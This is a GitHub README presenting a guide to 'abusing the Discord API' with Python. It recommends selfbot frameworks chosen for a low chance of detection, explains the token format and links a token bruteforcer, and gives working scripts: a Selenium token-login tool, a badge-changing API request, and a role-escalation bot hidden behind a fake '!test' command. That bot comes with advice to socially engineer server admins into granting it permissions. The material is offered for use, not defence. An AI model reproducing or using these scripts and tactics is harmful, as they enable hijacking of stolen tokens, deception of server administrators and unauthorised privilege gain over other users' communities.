# About
This is a repository with everything you need to know about abusing the Discord API, with the help of [Python](https://www.python.org/)!

## TOC
- [Tools](https://github.com/13-05/disc-python-hacks/blob/main/README.md#tools)
- [Self-Bots](https://github.com/13-05/disc-python-hacks/#self-bots-their-uses-risks-frameworks-and-some-communities)
- [Tokens](https://github.com/13-05/disc-python-hacks/#more-about-tokens)
- [UserIDs](https://github.com/13-05/disc-python-hacks/#more-about-userids)
- [Log-Ins](https://github.com/13-05/disc-python-hacks#discord-and-log-ins-what-to-know--how-to-abuse-it-credit-monst3red-and-hxr404)
- [The API](https://github.com/13-05/disc-python-hacks/#the-api)
- [Privilege Escalation](https://github.com/13-05/disc-python-hacks/blob/main/README.md#privilege-escalation-with-the-help-of-bot-users)
- [Markdown](https://github.com/13-05/disc-python-hacks/blob/main/README.md#messages--markdown)

## Tools
API exploits can be found very simply. _I_ find Discord exploits with [Burp Suite](https://portswigger.net/burp), [FireFox's Dev Tools](https://developer.mozilla.org/en-US/docs/Tools), and the [Python Requests Library](https://pypi.org/project/requests/). Also, pay special attention to any Discord API documentation; they'll also be a great tool on your journey.

## Self-bots: their uses, risks, frameworks, and some communities.
### Uses
A selfbot can be useful for quick Discord utilities; it's a bot running on a user account.
### Risks
A selfbot is always risky due to its being against Discord's [terms](https://discord.com/terms), although Discord won't notice unless you use it to carry out certain [risky actions](https://gist.github.com/13-05/c7691d633fd011e96aceebe889a5a4a9).
### Frameworks
- [DisCum.py](https://github.com/Merubokkusu/Discord-S.C.U.M) (powerful wrapper with lowest chance of getting caught, though hard to master) (example [here](https://github.com/13-05/disc-python-hacks/blob/main/examples/example-discum.py))
- [discord.py-self](https://github.com/dolfies/discord.py-self) (same syntax as discord.py, adapted to access user gateways) (example [here](https://github.com/13-05/disc-python-hacks/blob/main/examples/example-dpyself.py))
- [Anarchy.NET](https://github.com/not-ilinked/Anarchy) (powerful wrapper w/low chance of getting caught, weird syntax though) (example [here](https://github.com/not-ilinked/Anarchy/blob/master/Example%20projects/GuildDuplicator/Program.cs))
- [discord.js-selfbot](https://www.npmjs.com/package/discord.js-selfbot) (probably a high chance to get caught, i haven't used this before but it seems to be only a small modification to vanilla discord.js) (no example really, same syntax as discord.js tho and example [here](https://www.npmjs.com/package/discord.js-selfbot#example-usage))
### Communities
- [Ghost Discord](https://discord.gg/p7r9qJffHT)
- [Reaper Community Discord](https://discord.gg/Dv5HWRZsqH)
- [Lightning-Bot Discord](https://discord.gg/ZdKUFyx9h2)
- [Zenith Discord](https://discord.gg/CPHuvUaDeN)
- [r/Discord_Selfbots Subreddit](https://www.reddit.com/r/Discord_selfbots/)
## Tokens & UserIDs
A Discord token is the authorization for your account; a userid is your account's unique identifier (userids follow the [snowflake](https://en.wikipedia.org/wiki/Snowflake_ID) format).
## More About Tokens
Example token: `ODU4OTMyMDU4NjAwMjQzMjMw.YY4OOw.1hs4tL-J0dBMS_yKSTN6iuhqcPo`
<br />
- The first section (before the first period) is the account's userid, encoded in base64. <br /> In the example token, It's `ODU4OTMyMDU4NjAwMjQzMjMw`, which decodes to `858932058600243230`. Running a lookup on [discord.id](https://discord.id) will show that this is, indeed, the token's owner.
- The second section (after the first period, before the second period) is the token's mint (creation) date, in unix time. The unix is first converted to hex, and then base64. So, to decode it, you can convert this part of the token [from base64 to hex](https://base64.guru/converter/decode/hex). Next, you can take the hex number and [convert it to the decimal format](https://www.rapidtables.com/convert/number/hex-to-decimal.html) (you'll end up with `1636699707` if you do this with the example token). If you run this through a [unix to date converter](https://dqydj.com/unix-time-to-date-converter/), you'll get the token's mint date.
- The third (and final) section is a cryptographic verification system (HMAC/Hash based Message Authentication Code) that occurs on Discord's end. Not much can be done with this alone.
<br /> <br />
###### This token format can be abused and used to create a [token bruteforcer](https://github.com/13-05/disc-python-hacks/blob/main/abuse/token_cracker.py).
### Here's a chart (CREDIT: [ImLorio](https://github.com/ImLorio)):
![a chart denoting the discord token format](https://camo.githubusercontent.com/cf24aafb655bae3550c02c1f0f67122ddbcc3aa09ee782e9cbcfc919bc8bdba2/68747470733a2f2f692e696d6775722e636f6d2f36384b424950452e706e67)
## More about UserIDs
- First, you convert the userid to binary.
- First 42 bits of the binary can be converted to the decimal format, and the remaining integer is the amount of time since the Discord Epoch, `1420070400000`.
- The next 5 bits are an internal worker id
- The next 5 bits are an internal process id
- The last 12 bits are a count of every discord id, ever.
### Here's a chart (CREDIT: [ImLorio](https://github.com/ImLorio))
![a chart with the discord userid, broken down into its simplest form](https://camo.githubusercontent.com/84c08bc973496c1ba7d4e0520466d60d446082f6eeba92af2f443dbe60428cf0/68747470733a2f2f692e696d6775722e636f6d2f77416b7a43746b2e706e67)
## Discord and Log-ins: What to Know & How to Abuse It (CREDIT: [Monst3red](https://github.com/Monst3red) AND [hxr404](https://github.com/hxr404/))
The Discord login (in the browser's context, frontend) works as an iframe with the token inside, and it reloads to log you in. This can be abused (and it was, by [m-Phoenix852](https://gist.github.com/m-Phoenix852/b47fffb0fd579bc210420cedbda30b61)) for a token login script.
Because of this, you can log into the Discord webapp with a user token using selenium's webdrivers.
```py
# SCRIPT TAKEN FROM "https://github.com/Monst3red/Discord-Token-Login-Tool"

import selenium
from selenium import webdriver

token = input("Token here: ")

script = '''
    const login = (token) => {
        setInterval(() => document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`, 50);
        setTimeout(() => location.reload(), 2500);
    };''' + f'login("{token}")' # adapted from "https://gist.github.com/m-Phoenix852/b47fffb0fd579bc210420cedbda30b61"

driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://discord.com/login")
driver.execute_script(script)
```
The Discord login (in the API's context, backend) works as a WebSocket connection to the url `wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream`. I don't know much about this part, however, [Hornwitser](https://www.hornwitser.no/) has a good documentation of Discord's WebSockets on [his site](https://www.hornwitser.no/discord/analysis).
## The API

###### Currently, we're on API V9.

### Endpoints
One of the most notable URLs (in my opinion) is https://discord.com/api/v9/science; it's Discord's data collection URL. More info about it [here](https://luna.gitlab.io/discord-unofficial-docs/science.html).

I'm not gonna include all the other ones in this document, but right [here](https://github.com/GregTCLTK/Discord-Api-Endpoints/blob/master/Endpoints.md) and [here](https://gist.github.com/ghostrider-05/8f1a0bfc27c7c4509b4ea4e8ce718af0) each have tons of them listed.

### Hidden channels
Hidden channels are hidden on the frontend, yes, but there's nothing in the API blocking you from accessing these channels; they simply don't display. This was discovered long ago, and led to the development of [this](https://github.com/mwittrien/BetterDiscordAddons/tree/master/Plugins/ShowHiddenChannels) BD (BetterDiscord) extension's creation. This can be abused with, say, a selfbot or a [UserScript](https://greasyfork.org/en) to display all channels as if you have `Owner` level permissions on that server. NOTE: you can see the channel's name and topic, though no messages sent in there are able to be seen.

### Webhooks
Webhooks are an excellent way to send data to and from discord without creating a bot, and they also work well to route [selfbot](https://github.com/13-05/disc-python-hacks/#self-bots-their-uses-risks-frameworks-and-some-communities) responses. ([dsc.RED](https://github.com/13-05/discord.RED/blob/main/selfbot_red.py) responds through webhooks).

#### Hook Actions
A webhook url accepts a few different HTTP request types:

- `POST`: to send a message
- `GET` to get data about the webhook
- `DELETE` to delete the webhook remotely

###### NOTE: no external authorization is required to perform any of these actions (currently). If you have the webhook URL, you can do all of this.

#### Other Webhook Info
- They don't seem to be very highly rate-limited; if at all.
- They're one of the most easily abused pieces of Discord's API.
- They're channel-specific.
- They can't receive messages (as far as I know).
- Their tokens are a completely different format than User/Bot auth tokens.

### The HypeSquad Badges
You can earn one of three HypeSquad badges by taking the test (located below the Change Log in Discord's settings).

![Image of the hypesquad test's position](https://raw.githubusercontent.com/13-05/disc-python-hacks/main/images/squad-pos.png)

Each HypeSquad badge has an ID.
- `Bravery`: 1
- `Brilliance`: 2
- `Balance`: 3

You can abuse this fact to get *any HypeSquad Badge you want*.

Here's some code to do that, using Python's `requests` lib.
```py
# ADAPTED FROM "https://github.com/TT-Tutorials/Rage-Multi-Tool/blob/main/rage.py#L2804"

token = input('What\'s your token?: ')
house = input('Which HypeSquad Badge do you want?\n[1]: Bravery\n[2]: Brilliance\n[3]: Balance\n\n> ')
try:
  house_id = int(house)
except:
  print("You must input 1, 2, or 3!")

JSON_PAYLOAD = {'house_id': house_id}
JSON_HEADERS = {'Authorization': f'{token}'}

r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=JSON_HEADERS, json=JSON_PAYLOAD, timeout=10)
if r.status_code == 204:
  print(f"Badge successfully changed!")
else:
  print("There was an error changing your badge.")
```

### API Endpoint Access
Currently, the Discord API isn't very secure. To get access to nearly every [endpoint](https://github.com/13-05/disc-python-hacks/#endpoints), you only need to set the `Authorization` header of your request to a User/Bot token. Do note, though, that User tokens and Bot tokens grant different access to different endpoints; you have to experiment to find what token has more access. But, I'd assume User tokens have the least limitations (with the highest chance of getting in trouble).

### Bot & User Accounts
Bot accounts and User accounts both have their advantages and disadvantages, however, Bot accounts get rate-limited more frequently than User accounts. This fact can be useful when it comes to selfbotting and API exploitation.

### More Info
Some more documentation about the Discord API can be found below:
- [Luna's Docs](https://luna.gitlab.io/discord-unofficial-docs/)
- [Discum's "Using" Docs](https://github.com/Merubokkusu/Discord-S.C.U.M/tree/master/docs/using)
- [Birdie's Webhook Docs](https://birdie0.github.io/discord-webhooks-guide/)
- [The Official Docs](https://discord.com/developers/docs/intro)

## Privilege Escalation (with the help of Bot-Users)
This topic deserves a section all of its own, because it's so complicated.
Here's the stuff required to escalate your privileges in a certain server:
- Social engineering, to convince someone to invite your bot
- Programming knowledge, to write or understand a privilege-escalating script

Alright, now that I got those two out of the way, let's go through it.

Here's a quick script to give yourself a role:
```py
import discord
from discord.utils import get
import asyncio

bot_token = input('bot token: ')
role_to_give = input('EXACT name of role you\'d like to give yourself: ')

client = discord.Client()

@client.event
async def on_ready():
  print(f"logged in as {client.user}, privilege escalation script is running.")
  
@client.event
async def on_message(message, *member: discord.Member):
  if message.content == "!test": # fake command name so it's not suspicious; "you're just testing a new command"
    role = get(message.guild.roles, name=role_to_give)
    member = message.author
    try:
      await member.add_roles(role) 
      print(f"Successfully gave {message.author} the role {role_to_give}!")
    except:
      print("There was an error in privilege escalation; make sure your bot has permission to give you this role.")

client.run(bot_token)
```
Now, you need to run this script on a bot account. Then, you need to convince someone with good enough permissions to add your bot, and make them give your bot sufficient permissions to perform the privilege escalation on you.
Once that's done, you can do whatever you want with your new perms!

## Messages & Markdown
Alright, so this *also* deserves a section on its own, but not much is here.
### Simple Markdown
- \~\~strikethrough text\~\~
- \*\*bolded text\*\*
- \*italicized text (1)\*
- \_italicized text (2)\_
- \_\_underlined text\_\_
- \`single-lined codeblock\`
- \`\`\`multi-lined codeblock\`\`\`[*see below](#colored-codeblocks)
- \> single-lined quote
- \>\>\> multi-lined quote
### Colored Codeblocks
Discord added a new feature recently; ANSI colors in multi-lined codeblocks! To do them manually, check [here](https://gist.github.com/kkrypt0nn/a02506f3712ff2d1c8ca7c9e0aed7c06); otherwise, use my generator: a [redpoint command](https://github.com/13-05/redpoint)!
